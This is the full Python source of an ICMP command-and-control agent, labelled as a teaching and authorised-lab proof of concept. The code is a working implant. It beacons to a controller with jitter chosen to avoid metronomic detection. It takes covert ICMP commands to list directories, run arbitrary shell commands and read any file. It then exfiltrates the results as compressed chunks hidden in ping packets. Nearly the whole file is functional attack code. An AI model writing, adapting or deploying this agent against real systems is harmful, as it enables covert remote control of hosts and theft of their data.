#!/usr/bin/env python3
"""
agent.py — ICMP C2 agent (teaching / authorised-lab PoC).

Beacons outbound with optional jitter; sniffs for CMD! triggers (any ICMP
type from C2, including echo replies); replies with zlib-chunked ICMP
type-8 streams (START/CHUNK/END), RETRY, and ACK.
"""

from __future__ import annotations

import argparse
import os
import random
import socket
import subprocess
import sys
import threading
import time
import zlib

from scapy.all import ICMP, IP, Raw, send, sniff

TRIGGER_MARKER = b"CMD!"
CHUNK_SIZE = 36
ACK_TIMEOUT_S = 3.0  # clear busy if ACK lost (NAT / teaching)

INTERFACE = ""
C2_SERVER_IP = ""
BEACON_INTERVAL = 5.0
BEACON_JITTER = 0.3  # fraction of interval (±)
AGENT_ID = ""

active_stream_name = ""
cached_chunks_matrix: dict = {}
busy = False
_busy_lock = threading.Lock()
_stop = threading.Event()
_ack_timer: threading.Timer | None = None
_ack_timer_lock = threading.Lock()


def transmit_chunk(data_bytes: bytes, sequence_number: int) -> None:
    pkt = (
        IP(dst=C2_SERVER_IP)
        / ICMP(type=8, id=0xC200, seq=sequence_number)
        / Raw(load=TRIGGER_MARKER + data_bytes)
    )
    send(pkt, iface=INTERFACE, verbose=False)
    time.sleep(0.01)


def _cancel_ack_timer() -> None:
    global _ack_timer
    with _ack_timer_lock:
        if _ack_timer is not None:
            _ack_timer.cancel()
            _ack_timer = None


def _schedule_ack_timeout() -> None:
    """If ACK never arrives, clear busy so beacons resume (teaching-friendly)."""
    global _ack_timer

    def _expire() -> None:
        global busy, cached_chunks_matrix, active_stream_name
        with _busy_lock:
            if not busy:
                return
            busy = False
        cached_chunks_matrix, active_stream_name = {}, ""
        print("[*] ACK timeout — cleared busy; beacons resume")

    _cancel_ack_timer()
    with _ack_timer_lock:
        _ack_timer = threading.Timer(ACK_TIMEOUT_S, _expire)
        _ack_timer.daemon = True
        _ack_timer.start()


def optimize_and_stream(stream_name: str, raw_data_bytes: bytes) -> None:
    global active_stream_name, cached_chunks_matrix, busy
    with _busy_lock:
        busy = True
    active_stream_name = stream_name
    cached_chunks_matrix = {}

    compressed = zlib.compress(raw_data_bytes)

    seq = 0
    for i in range(0, len(compressed), CHUNK_SIZE):
        cached_chunks_matrix[seq] = compressed[i : i + CHUNK_SIZE]
        seq += 1

    start = TRIGGER_MARKER + f"[START]{seq}|{stream_name}".encode()
    send(
        IP(dst=C2_SERVER_IP) / ICMP(type=8, id=0xC200) / Raw(load=start),
        iface=INTERFACE,
        verbose=False,
    )
    time.sleep(0.05)

    for seq_id in range(seq):
        transmit_chunk(b"[CHUNK]" + cached_chunks_matrix[seq_id], seq_id)

    time.sleep(0.05)
    end = TRIGGER_MARKER + b"[END]" + stream_name.encode()
    send(
        IP(dst=C2_SERVER_IP) / ICMP(type=8, id=0xC200) / Raw(load=end),
        iface=INTERFACE,
        verbose=False,
    )
    # Wait briefly for ACK; if lost, still resume beacons
    _schedule_ack_timeout()


def send_beacon() -> None:
    load = TRIGGER_MARKER + f"BEACON|{AGENT_ID}".encode()
    pkt = (
        IP(dst=C2_SERVER_IP)
        / ICMP(type=8, id=0xC200, seq=0)
        / Raw(load=load)
    )
    send(pkt, iface=INTERFACE, verbose=False)


def _next_beacon_sleep() -> float:
    """Base interval ± jitter fraction (teaching: avoid metronomic beacons)."""
    if BEACON_JITTER <= 0:
        return BEACON_INTERVAL
    delta = BEACON_INTERVAL * BEACON_JITTER
    return max(1.0, BEACON_INTERVAL + random.uniform(-delta, delta))


def beacon_loop() -> None:
    while not _stop.is_set():
        with _busy_lock:
            is_busy = busy
        if not is_busy:
            try:
                send_beacon()
            except Exception:
                pass
        _stop.wait(_next_beacon_sleep())


def parse_trigger(packet) -> None:
    """Accept CMD! from C2 on any ICMP type (echo request or reply)."""
    global CHUNK_SIZE, cached_chunks_matrix, active_stream_name, busy

    if not packet.haslayer(IP) or not packet.haslayer(Raw):
        return
    if packet[IP].src != C2_SERVER_IP:
        return

    raw_payload = packet[Raw].load
    if TRIGGER_MARKER not in raw_payload:
        return

    idx = raw_payload.find(TRIGGER_MARKER)
    cmd_payload = raw_payload[idx + len(TRIGGER_MARKER) :].decode("utf-8", errors="ignore")

    if "|" not in cmd_payload:
        return

    action, argument = cmd_payload.split("|", 1)

    if action == "SIZE":
        try:
            CHUNK_SIZE = max(12, int(argument) - 28)
        except ValueError:
            pass
        return

    if action == "RETRY":
        try:
            missing_list = [int(x) for x in argument.split(",") if x != ""]
        except ValueError:
            return
        _cancel_ack_timer()
        for seq_id in missing_list:
            if seq_id in cached_chunks_matrix:
                transmit_chunk(b"[CHUNK]" + cached_chunks_matrix[seq_id], seq_id)
        time.sleep(0.05)
        end = TRIGGER_MARKER + b"[END]" + active_stream_name.encode()
        send(
            IP(dst=C2_SERVER_IP) / ICMP(type=8, id=0xC200) / Raw(load=end),
            iface=INTERFACE,
            verbose=False,
        )
        _schedule_ack_timeout()
        return

    if action == "ACK":
        _cancel_ack_timer()
        cached_chunks_matrix, active_stream_name = {}, ""
        with _busy_lock:
            busy = False
        return

    with _busy_lock:
        is_busy = busy
    if is_busy and action in ("LS", "RUN", "SEND"):
        return

    def _run_job(act=action, arg=argument):
        if act == "LS":
            try:
                listing = "\n".join(os.listdir(arg or ".")).encode()
                optimize_and_stream("ls_output.txt", listing)
            except Exception as e:
                optimize_and_stream("ls_output.txt", str(e).encode())
        elif act == "RUN":
            try:
                res = subprocess.run(arg, shell=True, capture_output=True)
                output = res.stdout + res.stderr
                if not output:
                    output = b"Empty command log output."
                optimize_and_stream("command_log.txt", output)
            except Exception as e:
                optimize_and_stream("command_log.txt", str(e).encode())
        elif act == "SEND":
            if not os.path.isfile(arg):
                optimize_and_stream(
                    "command_log.txt",
                    f"SEND failed: not a file: {arg!r}".encode(),
                )
                return
            try:
                filename = os.path.basename(arg)
                with open(arg, "rb") as f:
                    contents = f.read()
                optimize_and_stream(filename, contents)
            except Exception as e:
                optimize_and_stream("command_log.txt", str(e).encode())

    if action in ("LS", "RUN", "SEND"):
        # Do work off the sniff thread — Scapy send() inside prn is unreliable
        threading.Thread(target=_run_job, daemon=True).start()


def parse_args():
    ap = argparse.ArgumentParser(
        description="ICMP C2 agent — authorised lab / coursework only."
    )
    ap.add_argument(
        "--server",
        default=os.environ.get("ICMP_C2_SERVER"),
        help="Controller IP (or env ICMP_C2_SERVER)",
    )
    ap.add_argument(
        "--iface",
        default=os.environ.get("ICMP_C2_IFACE"),
        help="Sniff/send interface, e.g. eth0 or wlp8s0 (or env ICMP_C2_IFACE)",
    )
    ap.add_argument(
        "--beacon-interval",
        type=float,
        default=float(os.environ.get("ICMP_C2_BEACON", "5")),
        help="Base seconds between outbound BEACON (default 5)",
    )
    ap.add_argument(
        "--jitter",
        type=float,
        default=float(os.environ.get("ICMP_C2_JITTER", "0.3")),
        help="Jitter as fraction of interval, e.g. 0.3 = ±30%% (default 0.3)",
    )
    ap.add_argument(
        "--agent-id",
        default=os.environ.get("ICMP_C2_AGENT_ID") or socket.gethostname(),
        help="Id string in BEACON|<id> (default: hostname)",
    )
    return ap.parse_args()


def main() -> None:
    global INTERFACE, C2_SERVER_IP, BEACON_INTERVAL, BEACON_JITTER, AGENT_ID

    args = parse_args()
    if os.geteuid() != 0:
        sys.exit("[-] Needs root (sudo).")

    if not args.server or not args.iface:
        sys.exit(
            "[-] Set --server and --iface (or ICMP_C2_SERVER / ICMP_C2_IFACE). "
            "No baked-in lab defaults."
        )
    C2_SERVER_IP = args.server
    INTERFACE = args.iface
    BEACON_INTERVAL = max(1.0, args.beacon_interval)
    BEACON_JITTER = max(0.0, min(args.jitter, 0.9))
    AGENT_ID = args.agent_id

    print(
        f"[*] Agent online on {INTERFACE}; C2={C2_SERVER_IP}; "
        f"beacon={BEACON_INTERVAL}s jitter=±{BEACON_JITTER:.0%} id={AGENT_ID}"
    )
    threading.Thread(target=beacon_loop, daemon=True).start()
    try:
        sniff(iface=INTERFACE, filter="icmp", prn=parse_trigger, store=0)
    finally:
        _cancel_ack_timer()
        _stop.set()


if __name__ == "__main__":
    main()
